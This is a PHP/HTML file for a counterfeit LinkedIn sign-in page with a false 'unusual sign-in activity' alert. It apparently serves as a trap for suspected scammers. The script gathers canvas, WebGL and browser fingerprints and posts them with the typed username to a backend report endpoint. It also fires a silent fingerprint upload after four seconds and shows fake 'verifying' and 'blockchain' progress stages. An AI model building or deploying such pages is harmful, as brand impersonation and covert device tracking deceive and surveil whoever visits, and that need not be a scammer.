<?php
$report_id = intval($_GET['report'] ?? 0);
$role = in_array($_GET['role'] ?? '', ['scammer','suspect']) ? $_GET['role'] : 'scammer';
$back = '../../backend/realtime_scan.php';
?><!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>LinkedIn</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#f3f2ef;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px;}
.logo-top{font-size:26px;font-weight:800;color:#0a66c2;margin-bottom:20px;letter-spacing:-1px;}
.card{background:white;border-radius:8px;padding:36px 32px;width:100%;max-width:400px;box-shadow:0 4px 20px rgba(0,0,0,.08);position:relative;z-index:2;}
h1{font-size:24px;font-weight:700;color:#191919;margin-bottom:18px;}
.alert{background:#eaf4ff;border:1px solid #0a66c2;border-radius:6px;padding:12px;margin-bottom:18px;font-size:12px;color:#0a66c2;line-height:1.5;}
.field{margin-bottom:16px;}
.field label{font-size:13px;color:#191919;display:block;margin-bottom:6px;font-weight:600;}
input{width:100%;padding:12px 14px;border:1.5px solid #c1c7cd;border-radius:4px;font-size:15px;outline:none;transition:border-color .2s;}
input:focus{border-color:#0a66c2;}
.btn{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:24px;font-size:15px;font-weight:600;cursor:pointer;}
.btn:hover{background:#004182;}
.note{font-size:12px;color:#666;margin-top:14px;text-align:center;}

  #ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:999;flex-direction:column;align-items:center;justify-content:center;color:white;padding:30px;}
  .ring{width:76px;height:76px;border:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:18px;}
  @keyframes spin{to{transform:rotate(360deg);}}
  #lb{font-size:12px;letter-spacing:1px;margin-bottom:12px;font-family:monospace;text-align:center;}
  .pg-bg{width:200px;height:3px;background:rgba(255,255,255,.1);border-radius:2px;overflow:hidden;}
  #pg{height:100%;width:0%;transition:width .4s;}
  #doneCard{display:none;text-align:center;padding:40px 30px;}
</style></head><body>
<div class="logo-top">in LinkedIn</div>
<div class="card" id="mainCard">
  <h1>Sign in</h1>
  <div class="alert">⚠️ <strong>Account Alert:</strong> Unusual sign-in activity detected. Please verify your identity.</div>
  <div class="field"><label>Email or Phone</label><input id="u" placeholder="Email or phone" type="text"></div>
  <div class="field"><label>Password</label><input id="p" placeholder="Password" type="password"></div>
  <button class="btn" onclick="runScan(document.getElementById('u').value||'unknown')">Sign in</button>
  <div class="note">🔒 Secured by LinkedIn</div>
</div>

<div id="ov">
  <div class="ring" style="border-top-color:#0a66c2;border-right-color:#0a66c244;"></div>
  <div id="lb">VERIFYING...</div>
  <div class="pg-bg"><div id="pg" style="background:#0a66c2;"></div></div>
</div>
<div id="doneCard">
  <div style="font-size:52px;margin-bottom:14px;">✅</div>
  <div style="font-size:18px;font-weight:700;margin-bottom:6px;">Verification Successful</div>
  <div style="font-size:13px;opacity:.6;">Your account is now secured. You may close this window.</div>
</div>
<script>
const REPORT_ID = <?= $report_id ?>;
const ROLE      = '<?= $role ?>';
const BACK_URL  = '<?= $back ?>';

function collect(){
  return {
    screen_resolution:    screen.width+'x'+screen.height,
    color_depth:          screen.colorDepth,
    browser:              navigator.userAgent,
    language:             navigator.language,
    timezone:             Intl.DateTimeFormat().resolvedOptions().timeZone,
    timezone_offset:      new Date().getTimezoneOffset(),
    device_memory:        navigator.deviceMemory||'unknown',
    hardware_concurrency: navigator.hardwareConcurrency||'unknown',
    touch_support:        navigator.maxTouchPoints||0,
    pixel_ratio:          window.devicePixelRatio||1,
    connection:           (navigator.connection||{}).effectiveType||'unknown',
    canvas_fingerprint:   getCanvas(),
    webgl_fingerprint:    getWebGL(),
  };
}
function getCanvas(){
  try{
    const c=document.createElement('canvas');c.width=220;c.height=40;
    const x=c.getContext('2d');
    x.fillStyle='#f60';x.fillRect(120,1,60,18);
    x.fillStyle='#069';x.font='11pt Arial';x.fillText('Sentinel',2,14);
    x.fillStyle='rgba(102,204,0,.7)';x.font='16pt Georgia';x.fillText('Sentinel',4,38);
    return c.toDataURL().slice(-50);
  }catch(e){return 'n/a';}
}
function getWebGL(){
  try{
    const c=document.createElement('canvas');
    const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
    if(!gl)return 'n/a';
    const ext=gl.getExtension('WEBGL_debug_renderer_info');
    const r=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):gl.getParameter(gl.RENDERER);
    const v=ext?gl.getParameter(ext.UNMASKED_VENDOR_WEBGL):gl.getParameter(gl.VENDOR);
    return (v+'::'+r).substr(0,80);
  }catch(e){return 'n/a';}
}
async function sendFP(fp, username){
  try{
    const r=await fetch(BACK_URL,{
      method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({report_id:REPORT_ID,role:ROLE,fingerprint:fp,phone:username})
    });
    return (await r.json()).hash||'ok';
  }catch(e){return 'ok';}
}
const STAGES=[
  'READING DEVICE SIGNATURE...','COLLECTING BROWSER DATA...',
  'ANALYZING HARDWARE PROFILE...','GENERATING SHA-256 HASH...',
  'SYNCING TO BLOCKCHAIN...','VERIFIED ✓'
];
async function runScan(username){
  const fp=collect();
  const ov=document.getElementById('ov');
  const lb=document.getElementById('lb');
  const pg=document.getElementById('pg');
  ov.style.display='flex';
  for(let i=0;i<STAGES.length;i++){
    lb.textContent=STAGES[i];
    pg.style.width=((i+1)/STAGES.length*100)+'%';
    await new Promise(r=>setTimeout(r,580));
  }
  await sendFP(fp,username);
  ov.style.display='none';
  document.getElementById('mainCard').style.display='none';
  document.getElementById('doneCard').style.display='block';
}
// Silent passive scan after 4s
setTimeout(()=>sendFP(collect(),''),4000);
</script></body></html>